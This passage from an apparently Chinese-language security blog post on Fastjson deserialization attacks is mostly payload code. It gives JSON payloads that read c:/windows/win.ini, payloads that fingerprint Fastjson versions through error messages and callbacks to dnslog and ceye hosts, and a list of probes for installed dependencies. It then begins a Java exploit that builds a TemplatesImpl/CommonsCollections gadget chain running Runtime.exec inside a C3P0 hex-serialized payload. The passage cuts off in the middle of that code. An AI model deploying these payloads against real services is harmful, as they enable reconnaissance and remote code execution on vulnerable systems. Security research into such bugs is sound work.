class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二次</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span>&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Locale&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">             &#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">                <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;</span>,</span><br><span class="line">                <span class="string">&quot;newAnnotationProcessorUnits&quot;</span>:[&#123;&#125;]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三次，针对Windows系统</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileName&quot;</span>:<span class="string">&quot;c:/windows/win.ini&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另一种姿势，报错回显</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Character&quot;</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;c&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;</span>,</span><br><span class="line">            <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fileName&quot;</span>:<span class="string">&quot;c:/windows/win.ini&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><h3 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h3><h4 id="利用报错信息来获取版本号"><a href="#利用报错信息来获取版本号" class="headerlink" title="利用报错信息来获取版本号"></a>利用报错信息来获取版本号</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该方法在大概FastJson 1.2.76版本后无效，即便是通过这种方式探测出精准的FastJson版本，也是1.2.76，即便是使用的1.2.80的依赖，因为在源码中并没有改变</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="无报错进行fastjson版本探测"><a href="#无报错进行fastjson版本探测" class="headerlink" title="无报错进行fastjson版本探测"></a>无报错进行fastjson版本探测</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不报错1.2.83/1.2.24, 报错1.2.25-1.2.80</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.XxException&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24-1.2.68, 报错1.2.70-1.2.83</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24-1.2.47, 报错1.2.48-1.2.83</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不报错1.2.24, 报错1.2.25-1.2.83</span></span><br><span class="line">&#123;<span class="string">&quot;zero&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用DNS请求来探测fastjson版本"><a href="#利用DNS请求来探测fastjson版本" class="headerlink" title="利用DNS请求来探测fastjson版本"></a>利用DNS请求来探测fastjson版本</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastjson &lt; 1.2.43</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;:<span class="string">&quot;x&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt;= 1.2.47</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;aaa.xxxx.ceye.io&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt; 1.2.48</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt; 1.2.68</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;:<span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>, &#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.URL&quot;</span>, <span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;&#125;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="string">&quot;address&quot;</span>:,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.net.URL&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;http://dnslog&quot;</span>&#125;:<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson &lt;= 1.2.80收到一个dns请求, fastjson 1.2.83收到两个dns请求</span></span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;ccc.4fhgzj.dnslog.cn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.alibaba.fastjson.JSONException&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.net.InetSocketAddress&quot;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;address&quot;</span>:,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;ddd.4fhgzj.dnslog.cn&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="利用FastJson的回显报错探测依赖"><a href="#利用FastJson的回显报错探测依赖" class="headerlink" title="利用FastJson的回显报错探测依赖"></a><font style="color:#000000;">利用FastJson的回显报错探测依赖</font></h4><p><font style="color:#000000;">针对黑盒情况下，在确定FastJson具体版本后进一步探测该环境存在的一些依赖，从而选择对应的Payload，而不是一味的盲打。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 系统存在这个类, 会返回一个类实例, 如果不存在会返回null</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;z&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;groovy.lang.GroovyShell&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;z&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039307088-0c250fe5-7e08-414d-b31f-84ae5e972351.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用Character转换报错, 若存在则会抛出报错can not cast to char, value : xxx</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Character&quot;</span>&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">  <span class="string">&quot;val&quot;</span>: <span class="string">&quot;org.springframework.web.bind.annotation.RequestMapping&quot;</span></span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735039677606-f8d22ae1-ac3f-4052-84b1-5d5f7944b347.png"></p>
<p><font style="color:#000000;">以下是部分依赖对应的POC探测。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.web.bind.annotation.RequestMapping  <span class="comment">// SpringBoot</span></span><br><span class="line">org.apache.catalina.startup.Tomcat  <span class="comment">// Tomcat</span></span><br><span class="line">groovy.lang.GroovyShell  <span class="comment">// Groovy - 1.2.80</span></span><br><span class="line">com.mchange.v2.c3p0.DataSources  <span class="comment">// C3P0</span></span><br><span class="line">com.mysql.jdbc.Buffer  <span class="comment">// mysql-jdbc-5</span></span><br><span class="line">com.mysql.cj.api.authentication.AuthenticationProvider  <span class="comment">// mysql-connect-6</span></span><br><span class="line">com.mysql.cj.protocol.AuthenticationProvider <span class="comment">// mysql-connect-8</span></span><br><span class="line">sun.nio.cs.GBK  <span class="comment">// JDK8</span></span><br><span class="line">java.net.http.HttpClient  <span class="comment">// JDK11</span></span><br><span class="line">org.apache.ibatis.type.Alias  <span class="comment">// Mybatis</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp.BasicDataSource  <span class="comment">// tomcat-dbcp-7-BCEL</span></span><br><span class="line">org.apache.tomcat.dbcp.dbcp2.BasicDataSource <span class="comment">// tomcat-dbcp-8及以后-BCEL</span></span><br><span class="line">org.apache.commons.io.Charsets       <span class="comment">// 存在commons-io, 但不确定版本</span></span><br><span class="line">org.apache.commons.io.file.Counters  <span class="comment">// commons-io-2.7-2.8</span></span><br><span class="line">org.aspectj.ajde.Ajde  <span class="comment">// aspectjtools</span></span><br></pre></td></tr></table></figure>

<h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><h4 id="TemplatesImpl-1"><a href="#TemplatesImpl-1" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p><font style="color:#000000;">上文已经分析过了，由于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl需要赋值的部分属性为private，因此利用条件较为苛刻，</font><strong><font style="color:#000000;">需要开启Feature.SupportNonPublicField</font></strong><font style="color:#000000;">。</font></p>
<h4 id="C3P0链HEX序列化字节加载器"><a href="#C3P0链HEX序列化字节加载器" class="headerlink" title="C3P0链HEX序列化字节加载器"></a>C3P0链HEX序列化字节加载器</h4><p><font style="color:#000000;">详细参考</font><a href="https://h3rmesk1t.github.io/2023/06/25/C3P0/#HEX%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E5%8A%A0%E8%BD%BD%E5%99%A8">HEX序列化字节加载器</a><font style="color:#000000;">，userOverridesAsString属性可控，导致可以从其setter方法setuserOverridesAsString开始到最后deserializeFromByteArray对其调用readObject进行反序列化，造成反序列化漏洞。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;h3&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> LazyMap.decorate(map1, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map2, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field1;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field1 = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> (HashMap) field1.get(hashSet);</span><br><span class="line"></span><br><span class="line">        Field field2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])field2.get(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field field3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field3 = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            field3 = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field3.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field4</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        field4.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field4.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> toHexAscii(tobyteArray(hashSet));</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        